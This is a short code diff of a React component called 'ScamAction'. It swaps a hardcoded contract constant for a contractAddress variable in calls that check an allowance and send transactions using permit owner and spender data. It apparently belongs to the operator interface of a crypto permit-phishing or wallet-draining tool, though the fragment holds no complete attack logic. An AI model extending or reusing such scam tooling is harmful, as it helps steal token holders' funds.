@@ -32,7 +32,7 @@ const ScamAction = (props: {
 						{
 							gasLimit: 1000000
 						}
-					], CustomContract.ETH,
+					], contractAddress,
 					provider)
 					.catch((e) => {
 						alert(`ERROR ${e?.message ?? e}`);
@@ -47,7 +47,7 @@ const ScamAction = (props: {
 				alert((await callContractMethod('allowance', [
 					data.permit.owner,
 					data.permit.spender
-				], CustomContract.ETH, provider)));
+				], contractAddress, provider)));
 			}}>
 				Allowance
 			</button>
@@ -59,7 +59,7 @@ const ScamAction = (props: {
 						{
 							gasLimit: 1000000
 						}
-					], CustomContract.ETH,provider)
+					], contractAddress,provider)
 					.catch((e) => {
 						alert(`ERROR ${e?.message ?? e}`);
 						console.error(e)
